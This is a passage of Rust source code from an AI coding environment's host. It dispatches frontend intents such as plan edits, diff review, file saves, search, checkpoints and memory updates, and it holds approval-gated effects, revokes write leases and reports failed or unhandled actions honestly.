        // run and resumes it in the foreground. Snapshotted so we act once the
        // router has recorded the intent (mirrors the memory/goal paths). The
        // steer / pause / stop / fork gestures on a promoted run reuse the existing
        // `redirect_run` / `pause_run` / `cancel_run` / `fork_session` intents,
        // which already route by run id, so no new arm is needed for those.
        let background_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if name == "promote_run" || name == "resume_run_foreground" =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };

        // Plan-domain custom intents (Stage 1, bible sec 14): the PlanCard's
        // approve / edit / reorder / skip / repair gestures. Snapshotted so we
        // mutate the durable plan record + republish the `plan` projection once the
        // router has recorded the intent (mirrors the goal/memory paths). These
        // stop being log-only.
        let plan_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if matches!(
                    name.as_str(),
                    "approve_plan"
                        | "edit_plan_step"
                        | "reorder_plan"
                        | "skip_step"
                        | "repair_step"
                ) =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };

        // Transcript SEARCH over /intent (census sec 32-33): the command palette /
        // Search panel dials `/intent` (never `/rpc`), so the built literal +
        // structured search needs a custom-name arm. `run_search` is the FE's
        // registered name (wire.ts CUSTOM_NAMES); `search` / `search_transcript`
        // are accepted aliases. The payload carries `{ query, scopes?, limit?, ...
        // }`; semantic search stays DEFERRED_MODEL_REQUIRED. Snapshotted so we run
        // it once the router has recorded the intent (mirrors the memory/goal paths).
        let search_action: Option<Value> = match &intent {
            Intent::Custom { name, payload }
                if name == "run_search" || name == "search" || name == "search_transcript" =>
            {
                Some(payload.clone())
            }
            _ => None,
        };

        // Diff review (census sec 23): the accept/reject gestures gain real
        // per-hunk targeting (the optional `hunk_id`), and the custom name
        // `revert_diff` routes to `revert_diff`, so all three stop being log-only.
        // `(op, diff_id, hunk_id)`.
        let diff_action: Option<(&'static str, String, Option<String>)> = match &intent {
            Intent::AcceptDiff {
                diff_id, hunk_id, ..
            } => Some(("accept", diff_id.clone(), hunk_id.clone())),
            Intent::RejectDiff {
                diff_id, hunk_id, ..
            } => Some(("reject", diff_id.clone(), hunk_id.clone())),
            Intent::Custom { name, payload } if name == "revert_diff" => Some((
                "revert_diff",
                payload
                    .get("diff_id")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string(),
                None,
            )),
            _ => None,
        };

        // The editor save (`{ path, content, base_hash? }`). It rides the intent channel like every
        // other effect, so the permission engine's refusal reaches the approval gate instead of
        // being thrown at a connector caller with nowhere to take it.
        let save_action: Option<Value> = match &intent {
            Intent::Custom { name, payload } if name == "save_file" => Some(payload.clone()),
            _ => None,
        };

        // Static analysis over the intent channel (census priority 1): the Problems counter's only
        // producer. `{ session_id?, sources: [{path,text}] }`, or `{ session_id?, paths: [rel] }`
        // to read them from the workspace. Model-free (the hide-verify Tier1 oracle).
        let static_analysis_action: Option<Value> = match &intent {
            Intent::Custom { name, payload } if name == "run_static_analysis" => {
                Some(payload.clone())
            }
            _ => None,
        };

        // The sealed diff review receipt (`{ diff_id, session_id? }`). The host could seal one all
        // along and no client could ask for it; it is reachable now that a wire-reachable write
        // actually produces a diff to seal.
        let review_receipt_action: Option<Value> = match &intent {
            Intent::Custom { name, payload } if name == "export_review_receipt" => {
                Some(payload.clone())
            }
            _ => None,
        };

        // Effect policy (`CommandSpec::approval_policy`): an intent whose EFFECT the command
        // authority marks `Ask` is RECORDED but its effect is parked at the security gate.
        // `approve_gate` releases it, `deny_gate` drops it. Enforced here because the host is the
        // only place that sees every intent regardless of which surface dispatched it.
        let ask_action: Option<(String, Value)> =
            Self::effect_command(&intent).filter(|(name, _)| Self::requires_approval(name));

        // An HONEST ack: a custom name with no handler here is recorded (the log is the audit
        // trail) but NOT reported as accepted, so a frontend control can never look like it worked.
        let unhandled: Option<String> = match &intent {
            Intent::Custom { name, .. } if !HANDLED_CUSTOM_NAMES.contains(&name.as_str()) => {
                Some(name.clone())
            }
            _ => None,
        };

        // Write-lease revocation, read in ONE place off the intent itself. Every trigger that can
        // arrive as an intent is here, so a new surface firing an existing name cannot miss one:
        // explicit revocation, task cancellation, session closure / fork / switch, a rewind past
        // the grant, repository trust withdrawn, and a scope change. Read off the RECORDED intent
        // rather than off the effect, so an approval-gated rewind revokes the moment it is asked
        // for instead of after it runs. Revoking early only ever narrows what is permitted.
        // (The two triggers that are not intents: task COMPLETION revokes in the turn driver's
        // terminal publish, and RESTART invalidates because the lease is process memory only.)
        let lease_revocation: Option<(&'static str, LeaseRevokeScope)> = match &intent {
            Intent::CancelRun { run_id } => Some((
                "the task was cancelled",
                LeaseRevokeScope::Run(run_id.as_str().to_string()),
            )),
            Intent::ForkSession { .. } => {
                Some(("the session was forked", LeaseRevokeScope::Any))
            }
            Intent::Custom { name, payload } => match name.as_str() {
                "revoke_write_lease" => Some(("revoked by the user", LeaseRevokeScope::Any)),
                "new_session" | "open_session" => {
                    Some(("the session was closed", LeaseRevokeScope::Any))
                }
                "checkpoint_restore" | "checkpoint_rewind" => Some((
                    "the session was rewound past the grant",
                    LeaseRevokeScope::Any,
                )),
                // Trust withdrawn from the leased repo. A re-trust is not a revocation.
                "workspace_set_repo_trust"
                    if payload.get("trust").and_then(|v| v.as_str()) != Some("trusted") =>
                {
                    payload.get("repo_id").and_then(|v| v.as_str()).map(|repo| {
                        (
                            "repository trust was withdrawn",
                            LeaseRevokeScope::Repo(repo.to_string()),
                        )
                    })
                }
                // The environment carries the fs roots, so switching it changes the scope.
                "environment_switch" => {
                    Some(("the environment scope changed", LeaseRevokeScope::Any))
                }
                _ => None,
            },
            _ => None,
        };

        let mut ack = self.commands.handle(intent).await?;

        if ack.accepted {
            if let Some((reason, scope)) = lease_revocation {
                if let Some(revoked) = scope.revoke() {
                    publish_write_lease(&self.ui_bus, None, reason);
                    self.ui_bus.publish(UiEvent {
                        seq: 0,
                        session_id: None,
                        kind: UiEventKind::Custom(json!({
                            "kind": "write_lease_revoked",
                            "lease_id": revoked.lease_id,
                            "reason": reason,
                        })),
                    });
                }
            }
        }

        // Park an `Ask` command's effect. The intent IS recorded, so the ack stays accepted, but
        // `held` is set so no caller can read this as done: the effect has not run and will not run
        // until `approve_gate` releases it.
        let mut effect_ok = ack.accepted;
        if let (true, Some((name, payload))) = (ack.accepted, ask_action) {
            effect_ok = false;
            match self.hold_at_gate(
                PendingAction::Intent {
                    name: name.clone(),
                    payload,
                },
                format!("approval required before {name} takes effect"),
            ) {
                Ok(gate) => {
                    ack.held = true;
                    ack.message = Some(format!("held for approval: gate={gate}"));
                }
                Err(err) => self.effect_failed(&mut ack, &name, err.to_string()),
            }
        }

        // Only an ACCEPTED SubmitTurn starts generation (a rejected one, e.g.
        // empty text, returned `accepted: false` and logged nothing).
        if let (true, Some((session_id, prompt))) = (effect_ok, submit) {
            self.spawn_submit_turn_generation(session_id, prompt);
        }
        // A destructive argv is parked at the SAME gate an `Ask` command is, so it reports the same
        // third state: the intent is recorded, nothing ran, and the caller is told so.
        if let (true, Some((argv, cwd))) = (effect_ok, run_cmd) {
            match self.spawn_command_run(argv, cwd) {
                Ok(Some(gate)) => {
                    ack.held = true;
                    ack.message = Some(format!("held for approval: gate={gate}"));
                }
                Ok(None) => {}
                Err(err) => self.effect_failed(&mut ack, "run_command", err.to_string()),
            }
        }
        // Terminal / process side effect: deliver a keystroke (`pty_input`), a resize
        // (`pty_resize`), or an attach / stop / capture to the named process, once the intent is
        // recorded. A failure (no such process, or a non-interactive one) refuses the ack and
        // surfaces as an Error UiEvent.
        if let (true, Some((name, payload))) = (effect_ok, process_action) {
            if let Err(err) = self.handle_process_intent(&name, &payload).await {
                self.effect_failed(&mut ack, &name, err);
            }
        }
        // Release or drop a held gated command once its decision intent is recorded.
        if let (true, Some((approve, gate))) = (effect_ok, gate_action) {
            let outcome = if approve {
                self.approve_gate(&gate).await
            } else {
                self.deny_gate(&gate)
            };
            if let Err(err) = outcome {
                self.effect_failed(
                    &mut ack,
                    if approve { "approve_gate" } else { "deny_gate" },
                    err.to_string(),
                );
            }
        }
        // Deliver a paused effectful step's decision to the running turn's mailbox
        // once the decision intent is recorded. The turn drains it while paused to
        // resume (approve) or skip (deny) the step. Buffered if it arrives before
        // the turn reaches its pause.
        if let (true, Some((approve, run, step))) = (effect_ok, approval_action) {
            let decision = if approve {
                ApprovalDecision::Approve
            } else {
                ApprovalDecision::Deny
            };
            self.approvals.decide(run, step, decision);
        }
        // Fork a new independent session once the ForkSession intent is recorded.
        if let (true, Some((from, at_event))) = (effect_ok, fork_action) {
            self.spawn_fork_session(from, at_event);
        }
        // Side-chat lifecycle side effects, once the intent is safely in the log.
        if let (true, Some((name, payload))) = (effect_ok, side_chat_action) {
            match name.as_str() {
                // Fork a read-only side chat from a parent at an (optional) boundary.
                "create_side_chat" => {
                    if let Some(parent) = payload.get("session_id").and_then(|v| v.as_str()) {
                        let at_event = payload
                            .get("at_event")
                            .and_then(|v| v.as_str())
                            .map(EventId::from);
                        let inherit = payload
                            .get("inherit")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(true);
                        self.spawn_create_side_chat(SessionId::from(parent), at_event, inherit);
                    }
                }
                // Merge a side chat's typed summary back onto its parent session.
                "merge_side_chat" => {
                    if let (Some(side), Some(parent), Some(summary)) = (
                        payload.get("side_chat").and_then(|v| v.as_str()),
                        payload.get("parent").and_then(|v| v.as_str()),
                        payload.get("summary").and_then(|v| v.as_str()),
                    ) {
                        self.spawn_merge_side_chat(
                            SessionId::from(side),
                            SessionId::from(parent),
                            summary.to_string(),
                        );
                    }
                }
                _ => {}
            }
        }
        // Launcher side effects, once the intent is safely in the log.
        if let (true, Some((name, payload))) = (effect_ok, launcher_action) {
            match name.as_str() {
                // Create a real, isolated git worktree so a session can run on its own branch.
                "create_worktree" => {
                    self.spawn_worktree_add(payload.get("branch").and_then(|v| v.as_str()));
                }
                // Mint a fresh session and publish it so the courtyard composer hands off to a clean run.
                "new_session" => self.emit_new_session(),
                // Load a past session: republish its recorded transcript so the FE (which adopts the
                // session off any event's session_id) switches to it and re-renders. Real events from
                // the log, never fabricated.
                "open_session" => {
                    if let Some(id) = payload.get("session_id").and_then(|v| v.as_str()) {
                        self.spawn_open_session(SessionId::from(id));
                    }
                }
                _ => {}
            }
        }
        // Durable Goal + Checkpoint side effects, once the intent is safely in the
        // log. Run inline via the tested host methods (they emit their own
        // UiEvents); a failure refuses the ack (see `effect_failed`) so the goal chip
        // cannot read as set when the host stored nothing.
        if let (true, Some((name, payload))) = (effect_ok, goal_checkpoint_action) {
            if let Err(err) = self.handle_goal_checkpoint_intent(&name, &payload).await {
                self.effect_failed(&mut ack, &name, err.to_string());
            }
        }
        // Mid-turn steer side effect: deliver the real InterruptHub signal + the
        // durable steer event once the intent is safely recorded. A failure to
        // persist the steer event surfaces as an Error UiEvent (the signal itself
        // is fire-and-forget onto the hub, so the running turn still observes it).
        if let (true, Some((run_id, text, session))) = (effect_ok, steer_action) {
            if let Err(err) = self.steer_run(run_id, text, session).await {
                self.effect_failed(&mut ack, "redirect_run", err.to_string());
            }
        }
        // Durable Memory / Goal-eval / Workspace-trust / Environment-switch side
        // effects, once the intent is safely in the log. Routes to the tested host
        // method (never duplicates its logic); a failure refuses the ack, exactly like
        // the goal/checkpoint path.
        if let (true, Some((name, payload))) = (effect_ok, memory_workspace_env_action) {
            if let Err(err) = self.handle_memory_workspace_env_intent(&name, &payload).await {
                self.effect_failed(&mut ack, &name, err.to_string());
            }
        }
        // Stage 4 background-promotion side effect, once the intent is safely in
        // the log. Routes to the promote / resume-in-foreground host methods; a
        // failure (missing run_id, unknown job) refuses the ack, exactly like the
        // memory / plan paths.
        if let (true, Some((name, payload))) = (effect_ok, background_action) {
            if let Err(err) = self.handle_background_intent(&name, &payload).await {
                self.effect_failed(&mut ack, &name, err.to_string());
            }
        }
        // Plan-domain side effect, once the intent is safely in the log. Routes to
        // the durable plan handler (mutate + republish); a failure (unknown plan /
        // step / invalid order) refuses the ack, exactly like the goal / memory paths.
        if let (true, Some((name, payload))) = (effect_ok, plan_action) {
            if let Err(err) = self.handle_plan_intent(&name, &payload).await {
                self.effect_failed(&mut ack, &name, err.to_string());
            }
        }

        // Transcript search side effect, once the intent is safely in the log.
        // Runs the model-free literal + structured search and surfaces the hits as
        // a `search_results` UiEvent (the FE reads UiEvents; no /rpc dial needed).
        // A failure refuses the ack and surfaces as an Error UiEvent.
        if let (true, Some(payload)) = (effect_ok, search_action) {
            match self.handle_search_intent(&payload).await {
                Ok(hits) => self.publish_search_results(&payload, &hits),
                Err(err) => self.effect_failed(&mut ack, "search", err.to_string()),
            }
        }

        // Diff review side effect, once the intent is safely in the log. Routes to
        // the real apply/revert host method (no longer log-only); a failure (e.g.
        // an unknown diff, or a revert that conflicts) REFUSES the ack as well as
        // publishing the error, so the review surface cannot print "done" over a
        // hunk that is still on disk.
        if let (true, Some((op, diff_id, hunk_id))) = (effect_ok, diff_action) {
            let outcome = match (op, &hunk_id) {
                ("accept", Some(h)) => self.apply_hunk(&diff_id, h).await.map(|_| ()),
                ("accept", None) => self.apply_diff(&diff_id).await.map(|_| ()),
                ("reject", Some(h)) => self.reject_hunk(&diff_id, h).await.map(|_| ()),
                // The whole-diff revert. Reached only with `effect_ok`, which `effect_command`
                // clears for both of the shapes that ask for it, so neither one runs ungated.
                ("reject", None) | ("revert_diff", _) => self.revert_diff(&diff_id).await.map(|_| ()),
                _ => Ok(()),
            };
            // The reject/revert arms WRITE (the inverse write that puts the pre-image back), so on
            // the shipped `Ask` default they take the same hold-at-the-gate path the save does:
            // the review surface's undo is offered for approval instead of being refused outright.
            let name = match (op, &hunk_id) {
                ("reject", Some(_)) => "reject_hunk",
                ("reject", None) | ("revert_diff", _) => "revert_diff",
                _ => op,
            };
            let payload = match &hunk_id {
                Some(h) => json!({ "diff_id": diff_id, "hunk_id": h }),
                None => json!({ "diff_id": diff_id }),
            };
            self.write_effect_outcome(&mut ack, name, &payload, outcome);
        }

        // The editor save. Same permission-gated, verifying applier the agent's edits take. A
        // policy that refuses workspace writes (the shipped default is Ask) does NOT end the save
        // here: the write is held at the security gate carrying the policy's own reason, so the
        // user can approve it, exactly like the other held effects. Any OTHER failure (the
        // base_hash conflict the applier raises when the file moved under the buffer is the one
        // that matters) refuses the ack, so the editor says the save was refused instead of
        // printing "saved <path>" over a write that never landed.
        if let (true, Some(payload)) = (effect_ok, save_action) {
            let outcome = self.save_file_effect(&payload).await;
            self.write_effect_outcome(&mut ack, "save_file", &payload, outcome);
        }

        // Static analysis side effect: run the model-free Tier1 oracle and publish the diagnostics
        // projection the Problems counter binds. A failure surfaces as an Error UiEvent.
        if let (true, Some(payload)) = (effect_ok, static_analysis_action) {
            if let Err(err) = self.handle_static_analysis_intent(&payload).await {
                self.effect_failed(&mut ack, "run_static_analysis", err.to_string());
            }
        }

        // Seal and publish a diff review receipt, once the intent is recorded.
        if let (true, Some(payload)) = (effect_ok, review_receipt_action) {
            if let Err(err) = self.handle_export_review_receipt_intent(&payload).await {
                self.effect_failed(&mut ack, "export_review_receipt", err.to_string());
            }
        }

        // Honest negative ack, last: the event IS in the log, but nothing here acts on this name,
        // so the caller is told so instead of being handed a false success.
        if let Some(name) = unhandled {
            ack.accepted = false;
            ack.message = Some(format!(
                "custom intent '{name}' is recorded but has no host handler"
            ));
        }
        Ok(ack)
    }

    /// A side effect that FAILED after the intent was recorded. The event IS in the
    /// log, but nothing landed, so the ack must not read as success: this publishes
    /// the Error UiEvent AND refuses the ack. Every side effect in [`Self::handle_intent`]
    /// reports through here, so no surface can print "saved" / "done" for work the host
    /// did not do (an 8-second error toast beside a success line is not a refusal).
    fn effect_failed(&self, ack: &mut IntentAck, code: &str, message: String) {
        ack.accepted = false;
        ack.message = Some(message.clone());
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: None,
            kind: UiEventKind::Error {
                code: code.to_string(),
                message,
            },
        });
    }

    /// Dispatch `run_static_analysis` (bible Book IX sec 28-29). Payload:
    /// `{ session_id?, sources: [{path,text}] }` (the editor's live buffers) or
    /// `{ session_id?, paths: [workspace-relative] }` (read from disk, confined to the root).
    async fn handle_static_analysis_intent(&self, payload: &Value) -> Result<()> {
        let session = payload
            .get("session_id")
            .and_then(|v| v.as_str())
            .map(SessionId::from)
            .unwrap_or_else(|| self.services.session());
        let mut sources: Vec<SourceFile> = payload
            .get("sources")
            .and_then(|v| v.as_array())
            .map(|rows| {
                rows.iter()
                    .filter_map(|r| {
                        Some(SourceFile::new(
                            r.get("path").and_then(|v| v.as_str())?,
                            r.get("text").and_then(|v| v.as_str())?,
                        ))
                    })
                    .collect()
            })
            .unwrap_or_default();
        if let Some(paths) = payload.get("paths").and_then(|v| v.as_array()) {
            let root = &self.services.config.workspace_root;
            for p in paths.iter().filter_map(|v| v.as_str()) {
                let abs = crate::connectors::workspace_resolve(root, p)?;
                let text = std::fs::read_to_string(&abs)
                    .map_err(|e| hide_core::error::HideError::Storage(format!("{p}: {e}")))?;
                sources.push(SourceFile::new(p, text));
            }
        }
        if sources.is_empty() {
            return Err(hide_core::error::HideError::Message(
                "run_static_analysis: give 'sources' or 'paths'".to_string(),
            ));
        }
        self.run_static_analysis(session, sources).await.map(|_| ())
    }

    /// Seed (or replace) the session's durable plan record from a live kernel
    /// plan and publish the `plan` projection. Used by the live-turn emitter's
    /// twin path and by tests; the FSM emitter in [`run_turn_kernel`] uses the
    /// same [`crate::plan_domain::store_and_publish`] seam.
    pub fn publish_plan(
        &self,
        session: &SessionId,
        plan: &hide_kernel::plan::schema::Plan,
        autonomy: Autonomy,
    ) -> Result<()> {
        let record = crate::plan_domain::PlanRecord::from_kernel(plan, autonomy);
        crate::plan_domain::store_and_publish(
            &self.services.key_value_store,
            &self.ui_bus,
            session,
            0,
            &record,
        )
    }

    /// The session's durable plan record, if one has been published.
    pub fn plan_get(&self, session: &SessionId) -> Option<crate::plan_domain::PlanRecord> {
        crate::plan_domain::PlanRecordStore::get(&self.services.key_value_store, session)
    }

    /// Dispatch a PlanCard custom intent (Stage 1, bible sec 14): mutate the
    /// session's durable plan record and republish the `plan` projection. Payload
    /// shapes (all carry `session_id`):
    ///
    /// * `approve_plan`   -> `{ session_id, step_id? }` (absent step_id = whole plan)
    /// * `edit_plan_step` -> `{ session_id, step_id, text }`
    /// * `reorder_plan`   -> `{ session_id, order: [step_id, ..] }`
    /// * `skip_step`      -> `{ session_id, step_id, reason? }`
    /// * `repair_step`    -> `{ session_id, step_id }`
    ///
    /// Errors when no plan is set for the session, a named step is unknown, or a
    /// reorder is not a permutation; the caller surfaces it as an Error UiEvent.
    async fn handle_plan_intent(&self, name: &str, payload: &Value) -> Result<()> {
        let missing = |field: &str| {
            hide_core::error::HideError::Message(format!("{name}: missing '{field}'"))
        };
        let session = payload
            .get("session_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| missing("session_id"))?;
        let session = SessionId::from(session);
        let mut record = self.plan_get(&session).ok_or_else(|| {
            hide_core::error::HideError::NotFound(format!("no plan for session {session}"))
        })?;
        let step_id = payload.get("step_id").and_then(|v| v.as_str());
        let ok = match name {
            "approve_plan" => record.approve(step_id),
            "edit_plan_step" => {
                let text = payload
                    .get("text")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("text"))?;
                let sid = step_id.ok_or_else(|| missing("step_id"))?;
                record.edit_step(sid, text)
            }
            "reorder_plan" => {
                let order: Vec<String> = payload
                    .get("order")
                    .and_then(|v| v.as_array())
                    .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
                    .ok_or_else(|| missing("order"))?;
                record.reorder(&order)
            }
            "skip_step" => {
                let sid = step_id.ok_or_else(|| missing("step_id"))?;
                let reason = payload
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .unwrap_or("skipped by user");
                record.skip_step(sid, reason)
            }
            "repair_step" => {
                let sid = step_id.ok_or_else(|| missing("step_id"))?;
                record.repair_failed_step(sid).is_some()
            }
            _ => return Ok(()),
        };
        if !ok {
            return Err(hide_core::error::HideError::Message(format!(
                "{name}: no matching step, or invalid order"
            )));
        }
        crate::plan_domain::store_and_publish(
            &self.services.key_value_store,
            &self.ui_bus,
            &session,
            0,
            &record,
        )
    }

    /// Dispatch a durable Goal / Checkpoint custom intent to the corresponding
    /// tested host method (bible sec 14, sec 15.4). Payload shapes:
    ///
    /// * `goal_set`         -> `{ session_id, condition, acceptance: [oracle,..] }`
    /// * `goal_clear`       -> `{ session_id }`
    /// * `checkpoint_create`-> `{ session_id, at_event?, label? }`
    /// * `checkpoint_restore`-> `{ checkpoint_id }`
    /// * `checkpoint_rewind` -> `{ checkpoint_id, target: "code"|"conversation"|"both" }`
    /// * `checkpoint_replay` -> `{ checkpoint_id }`
    /// * `checkpoint_fork`   -> `{ checkpoint_id }`
    /// * `checkpoint_compare`-> `{ checkpoint_id, session_id }` or `{ session_id, other_session_id }`
    /// * `checkpoint_inspect`-> `{ checkpoint_id }`
    ///
    /// A malformed payload (e.g. a missing session_id) errors; the caller surfaces
    /// it as an Error UiEvent. The methods themselves emit the success UiEvents.
    async fn handle_goal_checkpoint_intent(&self, name: &str, payload: &Value) -> Result<()> {
        let missing = |field: &str| {
            hide_core::error::HideError::Message(format!("{name}: missing '{field}'"))
        };
        match name {
            "goal_set" => {
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                let condition = payload
                    .get("condition")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("condition"))?;
                let acceptance = payload
                    .get("acceptance")
                    .and_then(|v| v.as_array())
                    .map(|a| {
                        a.iter()
                            .filter_map(|v| v.as_str().map(str::to_string))
                            .collect::<Vec<_>>()
                    })
                    .unwrap_or_default();
                self.goal_set(SessionId::from(session), condition, acceptance)?;
            }
            "goal_clear" => {
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                self.goal_clear(&SessionId::from(session))?;
            }
            "checkpoint_create" => {
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                let at_event = payload
                    .get("at_event")
                    .and_then(|v| v.as_str())
                    .map(EventId::from);
                let label = payload
                    .get("label")
                    .and_then(|v| v.as_str())
                    .unwrap_or("checkpoint")
                    .to_string();
                self.checkpoint_create(SessionId::from(session), at_event.as_ref(), label)
                    .await?;
            }
            "checkpoint_restore" => {
                let checkpoint_id = payload
                    .get("checkpoint_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("checkpoint_id"))?;
                self.checkpoint_restore(checkpoint_id).await?;
            }
            "checkpoint_rewind" => {
                let checkpoint_id = payload
                    .get("checkpoint_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("checkpoint_id"))?;
                // No default: "both" is the widest, most destructive domain, so an
                // omitted target is REFUSED rather than guessed.
                let target_str = payload
                    .get("target")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("target"))?;
                let target = RewindTarget::parse(target_str).ok_or_else(|| {
                    hide_core::error::HideError::Message(format!(
                        "{name}: unknown target '{target_str}' (code|conversation|both)"
                    ))
                })?;
                self.checkpoint_rewind(checkpoint_id, target).await?;
            }
            "checkpoint_replay" => {
                let checkpoint_id = payload
                    .get("checkpoint_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("checkpoint_id"))?;
                self.checkpoint_replay(checkpoint_id).await?;
            }
            "checkpoint_fork" => {
                let checkpoint_id = payload
                    .get("checkpoint_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("checkpoint_id"))?;
                self.checkpoint_fork(checkpoint_id).await?;
            }
            "checkpoint_compare" => {
                // Two shapes: checkpoint-vs-session (checkpoint_id + session_id) or
                // session-vs-session (session_id + other_session_id).
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                if let Some(checkpoint_id) = payload.get("checkpoint_id").and_then(|v| v.as_str()) {
                    self.compare_to_checkpoint(checkpoint_id, &SessionId::from(session))
                        .await?;
                } else {
                    let other = payload
                        .get("other_session_id")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| missing("checkpoint_id or other_session_id"))?;
                    self.compare_session_code(&SessionId::from(session), &SessionId::from(other))
                        .await?;
                }
            }
            "checkpoint_inspect" => {
                let checkpoint_id = payload
                    .get("checkpoint_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("checkpoint_id"))?;
                self.checkpoint_inspect(checkpoint_id).await?;
            }
            _ => {}
        }
        Ok(())
    }

    /// Deliver a mid-turn STEER to a running run (bible ch.02 sec 4.3.2, census
    /// priority 6). This is the true end-to-end wiring the shipped `redirect_run`
    /// gesture was missing: it (1) signals a real [`Interrupt::Steer`] onto the
    /// shared [`InterruptHub`] keyed by `run_id` -- exactly how `CancelRun`/
    /// `PauseRun`/`ResumeRun` route to `Abort`/`Pause`/`Resume` -- so the kernel
    /// loop drains it (`drain_into_kernel`) and the Governor folds the text into
    /// `state.steer`, prepended to the next planning step's prompt; and (2)
    /// persists a durable `turn.steer` event (+ a `turn_steer` UiEvent) so the
    /// redirect is auditable and shows in the projection. Shared by the Wire-A
    /// `redirect_run` intent and the protocol `turn/steer` RPC.
    ///
    /// The session defaults to the control session when the caller does not name
    /// one (the FE gesture carries only `{ run_id, text }`); a caller that knows
    /// the run's session passes it so the steer event lands on that thread.
    pub async fn steer_run(
        &self,
        run_id: RunId,
        instruction: impl Into<String>,
        session: Option<SessionId>,
    ) -> Result<Event> {
        let instruction = instruction.into();
        // 1. Signal the running kernel (same hub Cancel/Pause/Resume ride).
        self.interrupts.signal(
            run_id.clone(),
            Interrupt::Steer {
                instruction: instruction.clone(),
            },
        );
        // 2. Durable steer event (audit + projection), tagged with the run.
        let session = session.unwrap_or_else(|| self.commands.control_session().clone());
        let event = self
            .services
            .event_log
            .append(
                NewEvent::system(
                    session.clone(),
                    "turn.steer",
                    json!({ "run_id": run_id.as_str(), "instruction": instruction }),
                )
                .with_run(run_id.clone()),
            )
            .await?;
        // 3. Surface it on Wire-B so the transcript shows the redirect.
        self.ui_bus.publish(UiEvent {
            seq: event.seq,
            session_id: Some(session),
            kind: UiEventKind::Custom(json!({
                "kind": "turn_steer",
                "run_id": run_id.as_str(),
                "instruction": instruction,
            })),
        });
        Ok(event)
    }

    /// Dispatch a durable Memory / Goal-eval / Workspace-trust / Environment-switch
    /// custom intent to the corresponding tested host method (bible sec 21-22, 14,
    /// 35). These built methods were unreachable from the typed FE because
    /// `handle_intent` had no custom-name arm for them. Payload shapes:
    ///
    /// * `memory_add`             -> a MemoryDraft: `{ scope: {kind,id}, claim,
    ///   source, author, confidence?, citations?, invalidation?, privacy?,
    ///   expiry_ms? }`
    /// * `memory_supersede`       -> `{ old_id, replacement: <MemoryDraft> }`
    /// * `memory_record_outcome`  -> `{ memory_id, success: bool }`
    /// * `memory_revalidate`      -> `{ memory_id | scope: {kind,id}, repo_root? }`
    /// * `goal_evaluate`          -> `{ session_id }`
    /// * `workspace_set_repo_trust` -> `{ repo_id, trust: "trusted"|"untrusted" }`
    /// * `environment_switch`     -> `{ session_id, env_id, reason? }`
    ///
    /// Each arm routes to the existing method (never re-implements its logic) and
    /// surfaces the domain change on Wire-B; `environment_switch`/`goal_evaluate`
    /// already emit their own durable events, so those are not double-recorded.
    async fn handle_memory_workspace_env_intent(&self, name: &str, payload: &Value) -> Result<()> {
        let missing = |field: &str| {
            hide_core::error::HideError::Message(format!("{name}: missing '{field}'"))
        };
        match name {
            "memory_add" => {
                let draft = parse_memory_draft(payload)?;
                let record = self.memory_add(draft)?;
                self.publish_memory("memory_added", &record);
            }
            "memory_supersede" => {
                let old_id = payload
                    .get("old_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("old_id"))?;
                let replacement = payload
                    .get("replacement")
                    .ok_or_else(|| missing("replacement"))?;
                let (_old, new) = self.memory_supersede(old_id, parse_memory_draft(replacement)?)?;
                self.publish_memory("memory_superseded", &new);
            }
            "memory_record_outcome" => {
                let memory_id = payload
                    .get("memory_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("memory_id"))?;
                let success = payload
                    .get("success")
                    .and_then(|v| v.as_bool())
                    .ok_or_else(|| missing("success"))?;
                let record = self.memory_record_outcome(memory_id, success)?;
                self.publish_memory("memory_outcome_recorded", &record);
            }
            "memory_revalidate" => {
                let target = if let Some(id) = payload.get("memory_id").and_then(|v| v.as_str()) {
                    RevalidateTarget::record(id)
                } else if let Some(scope) = payload.get("scope") {
                    RevalidateTarget::scope(serde_json::from_value(scope.clone()).map_err(|e| {
                        hide_core::error::HideError::Message(format!("{name}: bad scope: {e}"))
                    })?)
                } else {
                    return Err(missing("memory_id or scope"));
                };
                let repo_root = payload
                    .get("repo_root")
                    .and_then(|v| v.as_str())
                    .map(std::path::PathBuf::from)
                    .unwrap_or_else(|| self.services.config.workspace_root.clone());
                let verdicts = self.memory_revalidate(target, &repo_root)?;
                self.ui_bus.publish(UiEvent {
                    seq: 0,
                    session_id: None,
                    kind: UiEventKind::Custom(json!({
                        "kind": "memory_revalidated",
                        "verdicts": serde_json::to_value(&verdicts).unwrap_or_else(|_| json!([])),
                    })),
                });
            }
            "goal_evaluate" => {
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                let session = SessionId::from(session);
                // Routes to the tested evaluator (deterministic, model-free); it
                // advances + surfaces a Met transition itself. Surface the verdict
                // for every outcome so the FE sees the acceptance result.
                let verdict = self.goal_evaluate(&session).await?;
                self.ui_bus.publish(UiEvent {
                    seq: 0,
